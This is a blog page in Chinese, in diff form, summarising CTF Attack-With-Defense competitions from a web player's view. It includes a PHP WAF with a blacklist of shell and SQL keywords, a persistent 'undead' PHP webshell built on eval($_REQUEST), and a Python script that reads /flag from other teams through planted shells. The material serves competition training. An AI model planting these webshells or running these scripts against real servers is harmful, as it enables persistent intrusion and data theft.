@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>一文了解CTF线下赛---AWD | Welcome to Arsene.Tang &#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  
+    <meta name="description" content="web安全">
+  
+  
+  
+    <link rel="alternate" href="/atom.xml" title="Welcome to Arsene.Tang 's Blog" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/localshare/css/share.css">
+
+  
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Welcome to Arsene.Tang &#39;s Blog</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">一个喜欢web安全但菜的离谱的萌新</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        
+          <a class="main-nav-link" href="/."><i class="fa fa-home"></i> 首页</a>
+        
+          <a class="main-nav-link" href="/archives/"><i class="fa fa-archive"></i> 归档</a>
+        
+          <a class="main-nav-link" href="/about/"><i class="fa fa-user"></i> 关于</a>
+        
+          <a class="main-nav-link" href="/atom.xml"><i class="fa fa-rss"></i> 订阅</a>
+        
+      </nav>
+    </div>
+    <div id="search-form">
+      <div id="result-mask" class="hide"></div>
+      <label><input id="search-key" type="text" autocomplete="off" placeholder="搜索"></label>
+      <div id="result-wrap" class="hide">
+        <div id="search-result"></div>
+      </div>
+      <div class="hide">
+        <template id="search-tpl">
+          <div class="item">
+            <a href="/{path}" title="{title}">
+              <div class="title">{title}</div>
+              <div class="time">{date}</div>
+              <div class="tags">{tags}</div>
+            </a>
+          </div>
+        </template>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-一文了解CTF线下赛 --- AWD" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      一文了解CTF线下赛---AWD
+    </h1>
+  
+
+
+      </header>
+    
+    <div class="article-meta">
+      
+      <span class="article-date">
+  <i class="fa fa-date"></i>
+  <time class="dt-published" datetime="2021-10-17T16:00:00.000Z" itemprop="datePublished">2021年10月18日</time>
+</span>
+      
+      
+        <span class="article-views">
+  <i class="fa fa-views"></i>
+  <i id="busuanzi_container_page_pv">
+      <i id="busuanzi_value_page_pv"></i>
+  </i>
+</span>
+
+      
+      
+<a href="/2021/10/18/%E4%B8%80%E6%96%87%E4%BA%86%E8%A7%A3CTF%E7%BA%BF%E4%B8%8B%E8%B5%9B%20---%20AWD/#comments" class="article-comment-link">
+  
+    
+    
+    
+    
+    
+  
+  <i class="fa fa-commt"></i>
+  留言
+</a>
+
+
+    </div>
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="一文了解CTF线下赛-—-AWD"><a href="#一文了解CTF线下赛-—-AWD" class="headerlink" title="一文了解CTF线下赛 — AWD"></a>一文了解CTF线下赛 — AWD</h1><p>前几天和<code>Light1ng</code>的师傅们一起参加了在天津举办的第五空间决赛，虽然结果不尽如人意，全程被pwn爷爷带飞，而web的环境还时不时宕机，分不清是被打了还是主办方的环境坏了，所以web手基本上全程坐牢，太痛苦了，最后狗了一个三等奖，但这次比赛还是收获了很多，面基到了各位师傅很开心，接下来就来简单总结一下awd吧，因为我也只是个web手，所以说以下的总结也都只针对web哈</p>
+<span id="more"></span>
+
+<h2 id="1-什么是AWD"><a href="#1-什么是AWD" class="headerlink" title="1.什么是AWD"></a>1.什么是AWD</h2><p>AWD赛制是一种网络安全竞赛的赛制。AWD赛制由安全竞赛专家及行业专家凭借十多年实战经验，将真实网络安全防护设备设施加入抽象的网络环境中，模拟政府、企业、院校等单位的典型网络结构和配置，开展的一种人人对抗的竞赛方式，考验参赛者攻防兼备的能力。其主要特点为：强调实战性、实时性、对抗性，综合考量竞赛队的渗透能力和防护能力。(摘自百度百科)</p>
+<p>百度百科的说法有点太过于专业了，其实简单点说AWD就是攻防大战，我们可以进入到别人的网站，一般都是某个cms，大部分都是php的站，少部分可能会有Java或者python的，然后找到网站中的漏洞，利用它getshell，拿到对方服务器上的flag；我们也可以维护自己的网站，通过<code>xshell</code>和<code>xftp</code>，SSH连接上自己的服务器后，将源码下载下来，然后利用扫描工具扫描它的漏洞，对应删掉自带后门，上waf脚本，文件固化脚本等方式防止对手将木马写入我们服务器中；但我们不能删除源码，因为每一轮都会对所有队伍网站进行check，check不过的队伍会被扣分，然后分数会由check通过的队伍平分，所以我们首先要保证网站的正常服务功能不受影响，不能宕机</p>
+<h2 id="2-流程"><a href="#2-流程" class="headerlink" title="2.流程"></a>2.流程</h2><ol>
+<li><p>出题方会给每一支队伍部署同样环境的主机，主机有一台或者多台。</p>
+</li>
+<li><p>拿到机器后每个队伍会有一定的加固时间或没有加固时间，这个视规则而定。</p>
+</li>
+<li><p>每个服务、数据库、主机上都会可能存在 flag 字段，并且会定时刷新。通过攻击拿到 flag 后需要提交到裁判机进行得分，一般会提供指定的提交接口。下一轮刷新后，如果还存在该漏洞，可以继续利用漏洞获取 flag 进行得分。</p>
+</li>
+</ol>
+<h2 id="3-防守"><a href="#3-防守" class="headerlink" title="3.防守"></a>3.防守</h2><p>我觉得防守在awd中永远是最重要的，也是一开始就必须要做的事情，因为到后面如果被上了不死马或者被打宕机了，说实话就很难进行防守了，到时候就只有看着每一轮都疯狂扣分，那是真的心碎哈哈哈；所以比赛开始后一定要先防守，有的比赛会有加固时间而有的比赛是直接开始打，这种时候就很拼手速了；首先登录上ssh，看看ssh的密码，如果是弱密码或者和队伍名相同或相关的密码一定要抓紧改掉，如果被别人拿到了ssh密码基本上这比赛就没了；登陆上之后利用<code>xftp</code>将<code>html</code>目录直接下载下来，放入D盾或者其它扫描工具中扫描，一般它都会有自带的后门，先把后门的路径记录下来，因为所有队伍的环境都是一样的，你有后门的地方一定别的队伍也有，然后将自带后门删掉或者改掉；接下来就先登录我们自己的网站后台，将默认的后台密码改掉，默认的后台密码可以去百度中查询对应cms，一般来说是<code>admin admin</code>或者<code>admin 123456</code>，这一步也非常重要，如果网站后台密码被对手改掉也就很难操作了，所以说在团队赛中一般是一个人删后门一个人改后台密码；改完之后就可以在合适的地方上waf了，我们可以参考D盾的扫描结果，在一些存在危险函数的地方上waf，或者说在网站的入口上waf，一般在入口上waf效率是很高的的，接下来来演示一下怎么上，方法非常简单，这个waf出自大黑阔LTLT之手</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$Filter</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="comment">#如果要开启流量监控且过滤拦截请将Filter设置为ON 默认不开启过滤拦截 注意误拦</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$SAVEPATH</span> = <span class="string">&quot;/tmp/sec&quot;</span>;</span><br><span class="line"><span class="comment">#流量文件保存地址 默认在 /tmp/sec 中,可以自行修改</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#使用方法:将本文件在需要防护的php文件中include即可</span></span><br><span class="line"><span class="comment">#下面是敏感字符  参数和值  都将会被检测  可自定义敏感字符</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$black_list</span> = <span class="keyword">array</span>(<span class="string">&quot;pcntl&quot;</span>, <span class="string">&quot;assert&quot;</span>, <span class="string">&quot;phpinfo&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;popen&quot;</span>, <span class="string">&quot;fopen&quot;</span>, <span class="string">&quot;fclose&quot;</span>, <span class="string">&quot;fwrite&quot;</span>, <span class="string">&quot;passthru&quot;</span>, </span><br><span class="line">	<span class="string">&quot;symlink&quot;</span>, <span class="string">&quot;link&quot;</span>, <span class="string">&quot;syslog&quot;</span>,<span class="string">&quot;imap_open&quot;</span>, <span class="string">&quot;shell&quot;</span>, <span class="string">&quot;mail&quot;</span>, <span class="string">&quot;system&quot;</span>, <span class="string">&quot;hex&quot;</span>, <span class="string">&quot;chdir&quot;</span>, <span class="string">&quot;`&quot;</span>, <span class="string">&quot;var_dump&quot;</span>,</span><br><span class="line">	<span class="string">&quot;chr&quot;</span>, <span class="string">&quot;mkdir&quot;</span>, <span class="string">&quot;cat&quot;</span> , <span class="string">&quot;tac&quot;</span>, <span class="string">&quot;ls&quot;</span> ,<span class="string">&quot;echo&quot;</span>, <span class="string">&quot;print&quot;</span>, <span class="string">&quot;nl&quot;</span>, <span class="string">&quot;IFS&quot;</span> ,<span class="string">&quot;&lt;&quot;</span> ,<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;|&quot;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;select&quot;</span>,</span><br><span class="line">	<span class="string">&quot;union&quot;</span>, <span class="string">&quot;information_schema&quot;</span>, <span class="string">&quot;updatexml&quot;</span> ,<span class="string">&quot;exp&quot;</span> ,<span class="string">&quot;pwd&quot;</span>, <span class="string">&quot;rev&quot;</span>, <span class="string">&quot;sed&quot;</span>, <span class="string">&quot;file&quot;</span>, <span class="string">&quot;copy&quot;</span>, <span class="string">&quot;terminated&quot;</span>, </span><br><span class="line">	<span class="string">&quot;extractvalue&quot;</span>, <span class="string">&quot;concat&quot;</span>, <span class="string">&quot;order&quot;</span>, <span class="string">&quot;const&quot;</span>, <span class="string">&quot;&#123;&quot;</span>, <span class="string">&quot;&#125;&quot;</span> , <span class="string">&quot;REQUEST&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;include&quot;</span>,</span><br><span class="line">	<span class="string">&quot;require&quot;</span>, <span class="string">&quot;env&quot;</span>, <span class="string">&quot;strrev&quot;</span>, <span class="string">&quot;~&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;../&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter_</span>(<span class="params"><span class="variable">$keyF</span></span>)</span>&#123;</span><br><span class="line">	<span class="comment">#拦截后执行的函数,可以自定义</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$keyF</span> === <span class="string">&quot;ON&quot;</span>)&#123;</span><br><span class="line">		<span class="variable">$time</span> = md5(time());</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;flag&#123;<span class="subst">&#123;$time&#125;</span>&#125;&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$tra_all</span> = var_export(<span class="variable">$_REQUEST</span>, <span class="literal">TRUE</span>);</span><br><span class="line">file_put_contents(<span class="string">&quot;<span class="subst">&#123;$SAVEPATH&#125;</span>&quot;</span>, <span class="string">&quot;[+]PATH: <span class="subst">&#123;$_SERVER[&#x27;PHP_SELF&#x27;]&#125;</span> | HAED: <span class="subst">&#123;$_SERVER[&#x27;REQUEST_METHOD&#x27;]&#125;</span> | Traffic: <span class="subst">&#123;$tra_all&#125;</span>\n&quot;</span>, FILE_APPEND);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$Re_key</span> =&gt; <span class="variable">$Re_value</span>) &#123;</span><br><span class="line">	<span class="keyword">foreach</span> (<span class="variable">$black_list</span> <span class="keyword">as</span> <span class="variable">$b_key</span> =&gt; <span class="variable">$b_value</span>) &#123;</span><br><span class="line">		<span class="comment"># 先将字符串去除点</span></span><br><span class="line">		<span class="variable">$out_spot_key</span> = str_ireplace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$Re_key</span>);</span><br><span class="line">		<span class="variable">$out_spot_value</span> = str_ireplace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$Re_value</span>);</span><br><span class="line">		<span class="comment"># 字符串尝试替换black_list</span></span><br><span class="line">		<span class="variable">$bla_k</span> = str_ireplace(<span class="variable">$black_list</span>, <span class="string">&quot;_&quot;</span>, <span class="variable">$out_spot_key</span>);</span><br><span class="line">		<span class="variable">$bla_v</span> = str_ireplace(<span class="variable">$black_list</span>, <span class="string">&quot;_&quot;</span>, <span class="variable">$out_spot_value</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$out_spot_key</span>!=<span class="variable">$bla_k</span> || <span class="variable">$out_spot_value</span>!=<span class="variable">$bla_v</span>) &#123;</span><br><span class="line">			<span class="comment"># 检测到有奇怪输入,跳转到WAF防御界面</span></span><br><span class="line">			<span class="keyword">if</span> (<span class="variable">$writeabble</span> == <span class="number">0</span>)&#123;</span><br><span class="line">			file_put_contents(<span class="string">&quot;<span class="subst">&#123;$SAVEPATH&#125;</span>&quot;</span>, <span class="string">&quot;[WARNING]PATH: <span class="subst">&#123;$_SERVER[&#x27;PHP_SELF&#x27;]&#125;</span> | HAED: <span class="subst">&#123;$_SERVER[&#x27;REQUEST_METHOD&#x27;]&#125;</span> | Traffic: <span class="subst">&#123;$tra_all&#125;</span>\n&quot;</span>, FILE_APPEND);</span><br><span class="line">			<span class="variable">$writeabble</span> = <span class="number">1</span>;</span><br><span class="line">			&#125;	</span><br><span class="line">			filter_(<span class="variable">$Filter</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这个waf我已经在实战中用过了，确实是很好用，过滤的字符可以进行自定义，我们直接在需要的地方利用<code>include(&#39;waf.php&#39;)</code>包含waf，当它检测到危险字符时就会进行拦截，当然我们为了防止误拦也可以不开启<code>$Filter</code>，如果不开启的化，它就只会监控流量但不会做出拦截，下图我是开了拦截的，它就会反弹假flag</p>
+<p><img src="https://i.loli.net/2021/10/17/iaBDhXO85Mgbm2d.png" alt="image.png"></p>
+<p>然后我们还可以去看攻击者的流量，这一步是非常最要的，因为假如攻击者攻击成功的话，我们就可以通过分析攻击者攻击成功的这个流量去攻击其它的队伍，拿一波flag，这里流量的路径是<code>/tmp/sec</code>，我们来看看效果：</p>
+<p><img src="https://i.loli.net/2021/10/17/gORoQpGbtLwcqrV.png" alt="image.png"></p>
+<p>这里攻击者攻击我们的payload我们全都可以看到，假如攻击者攻击成功的话我们直接用这个payload去打别的队伍就行了，基本上一打一个准；但由于这里我们过滤的字符还是比较多的，如果过不掉每一轮的check的话，我们就可以关掉拦截，只监控，同样可以拿到别人的payload去打其他队</p>
+<p>假如我们不小心被对手种入了不死马应该怎么办呢？通常有下面几种克制方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">强行 kill 掉进程后重启服务</span><br><span class="line">建立一个和不死马相同名字的文件或者目录</span><br><span class="line">写脚本不断删除文件</span><br><span class="line">不断写入一个和不死马同名的文件</span><br></pre></td></tr></table></figure>
+
+<p>总结一下，awd中的防守主要就是下载源码，改后台密码，删掉自带后门，上waf，进行流量监控，杀掉不死马，还有一个文件固化的操作因为我实战中没有用过这里就不讲了，想了解的朋友可以去看看小迪的视频，讲的还是非常不错的，而且对应的脚本啥的也有，视频地址：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=79">https://www.bilibili.com/video/BV1JZ4y1c7ro?p=79</a></p>
+<h2 id="4-进攻"><a href="#4-进攻" class="headerlink" title="4.进攻"></a>4.进攻</h2><p>相对于防守相对比较固定的套路，进攻的方法那可就灵活太多了，很难找到固定的套路；首先在拿到我们自己的ip地址后，可以利用python脚本先生成批量ping的地址，因为第一步肯定是先获取对方网站的地址，有的比赛举办方会直接告诉大家所有队伍的地址，但有的比赛比如说bugku中的awd比赛就不会，这时候就需要我们先探测出来，这个脚本我是依照bugku中的比赛写的，很简单的几句代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    ip = <span class="string">&quot;192-168-1-&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;.pvp670.bugku.cn&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(ip)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/10/18/sYa1BdWLOn9Ziy6.png" alt="image.png"></p>
+<p>就先这样生成字典，然后复制进去，放入批量ping的工具中，批量ping的工具一般用<code>PingInfoView</code>，看哪个网址可以ping通就说明它存在</p>
+<p><img src="https://i.loli.net/2021/10/18/qwamz4n5cEAOY12.png" alt="image.png"></p>
+<p>找到对方的网站之后，我们可以先利用前面获得的自带后门的路径去试试，看它有没有删掉，如果没有删掉，那就可以利用这个自带后门getshell上不死马了，这个后面再慢慢说；与此同时，我们要快速登录对方的网站后台地址，后台的路径可以去百度搜对应的cms，首先试试看默认密码能不能登录上去，如果能的话马上登上去修改它的密码，说实话这就是个拼手速的游戏，争取能抢在所有队前面把默认密码都改了，这样相当于拿下了所有队伍的后台，后续利用后台getshell就非常方便了</p>
+<p>当我们把所有队的自带后门都测试完，后台密码就改了之后，就可以给还没删掉自带后门的队伍上不死马了，因为很多自带后门都是<code>GET</code>型木马，所以说我们不能直接利用它连接蚁剑，我们可以在里面嵌套一个<code>POST</code>木马，演示如下：</p>
+<p><img src="https://i.loli.net/2021/10/18/zxBa6TAtQcFC1Ow.png" alt="image.png"></p>
+<p>就像这样就好了，就可以直接利用这个连上蚁剑了，连上之后我们就可以找一个比较隐蔽的地方上不死马了，先解释一下啥叫不死马吧，不死马的主要功能是<strong>执行后</strong>会<strong>不断</strong>在该路径生成一个 shell 文件，方便后续使用，不死马如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ignore_user_abort(<span class="literal">true</span>);</span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;1.php&quot;</span>;</span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&quot;&lt;?php eval(\$_REQUEST[1]);?&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">TRUE</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!file_exists(<span class="variable">$file</span>)) &#123;</span><br><span class="line">file_put_contents(<span class="variable">$file</span>, <span class="variable">$shell</span>);</span><br><span class="line">&#125;</span><br><span class="line">usleep(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>相当于有了这个脚本后它就可以不断的在当前目录下写马，删掉之后接着写，就很狠，这个不死马的名字可以取的和正常文件名字差不多，这样对方就很难找了</p>
+<p>当对方删掉了自带后门之后，我们就可以利用改了的后台密码登入网站后台中，然后在网上搜一搜对应cms如何后台getshell，如果比赛是离线环境的话，我们就要事先准备好离线漏洞库了，在里面搜索对应的cms，对应的版本getshell就行了，getshell之后还是一样的上不死马就行，一般来讲这些漏洞都是现成的，如果要从源码中现审的话时间可能不太够，因为awd节奏实在太快了，它主要考察的就是临场反应的能力和脚本编写的能力，其中有一个很重要的脚本就是批量提交flag的脚本，因为如果队伍比较多的话手动提交flag是不太来得及的，所以说当我们getshell了之后就可以直接编写脚本来批量获取并且提交flag了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"></span><br><span class="line">urllib3.disable_warnings() <span class="comment">#忽略https证书告警</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">POC</span>(<span class="params">target_url</span>):</span></span><br><span class="line">    vuln_url = target_url + <span class="string">&quot;/avatar/system/1.php?s=print_r(readfile(%27/flag%27))&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">                <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url=vuln_url, headers=headers, verify=<span class="literal">False</span>, timeout=<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(response.text)</span><br><span class="line">            f = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">            f.write(response.text + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./url.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        results = f.readlines()</span><br><span class="line">    <span class="keyword">for</span> result <span class="keyword">in</span> results:</span><br><span class="line">            target_url = result.strip()</span><br><span class="line">            POC(target_url)</span><br></pre></td></tr></table></figure>
+
+<p>这个脚本仅供参考，这个脚本是le1a师傅给我的，我还没有在比赛中验证过它哈哈，这个需要先把url写入url.txt中，然后它会自动把flag写入flag.txt中</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"></span><br><span class="line">urllib3.disable_warnings() <span class="comment">#忽略https证书告警</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">POC</span>(<span class="params">flag</span>):</span></span><br><span class="line">    vuln_url = <span class="string">&quot;https://ctf.bugku.com/pvp/submit.html?token=[token]&amp;flag=&quot;</span> + flag</span><br><span class="line">    headers = &#123;</span><br><span class="line">                <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url=vuln_url, headers=headers, verify=<span class="literal">False</span>, timeout=<span class="number">10</span>)</span><br><span class="line">        <span class="built_in">print</span>(response.text)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;fail&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        results = f.readlines()</span><br><span class="line">    <span class="keyword">for</span> result <span class="keyword">in</span> results:</span><br><span class="line">        flag = result.strip()</span><br><span class="line">        POC(flag)</span><br></pre></td></tr></table></figure>
+
+<p>然后这个是提交flag的脚本，都没有试过，准备哪天找个bugku的awd比赛来试试脚本</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>写了这么多，时间有点紧感觉总结的很杂乱，不是很成体系，其实awd最重要的就是要提前准备好脚本和waf，以及漏洞库；比赛前队伍中做好分工，比赛开始的时候拼手速，先把必须要做的都做了，然后随机应变，现场搜索漏洞或者做好流量监控找机会打别人就好了，如果被打了心态也不要崩，因为他肯定是批量打的不可能只打我们一家，抓好流量找机会反打就好了</p>
+<p>参考链接：</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/201222.html">https://www.freebuf.com/articles/network/201222.html</a></p>
+
+        
+            <div id="toc-article">
+                
+  <div class="widget-wrap" id="toc-wrap">
+    <h3 class="widget-title"><i class="fa fa-toc"></i> 文章目录</h3>
+    <div class="widget">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E6%96%87%E4%BA%86%E8%A7%A3CTF%E7%BA%BF%E4%B8%8B%E8%B5%9B-%E2%80%94-AWD"><span class="toc-text">一文了解CTF线下赛 — AWD</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E4%BB%80%E4%B9%88%E6%98%AFAWD"><span class="toc-text">1.什么是AWD</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%B5%81%E7%A8%8B"><span class="toc-text">2.流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E9%98%B2%E5%AE%88"><span class="toc-text">3.防守</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E8%BF%9B%E6%94%BB"><span class="toc-text">4.进攻</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></li></ol>
+    </div>
+  </div>
+
+
+            </div>
+        
+        
+          <blockquote id="copyright">
+              <p>原文链接: <a href="https://arsenetang.github.io/2021/10/18/一文了解CTF线下赛 --- AWD/">https://arsenetang.github.io/2021/10/18/一文了解CTF线下赛 --- AWD/</a></p>
+              <p>版权声明: 转载请注明出处.</p>
+          </blockquote>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <div class="article-tag-wrap">
+          
+
+          
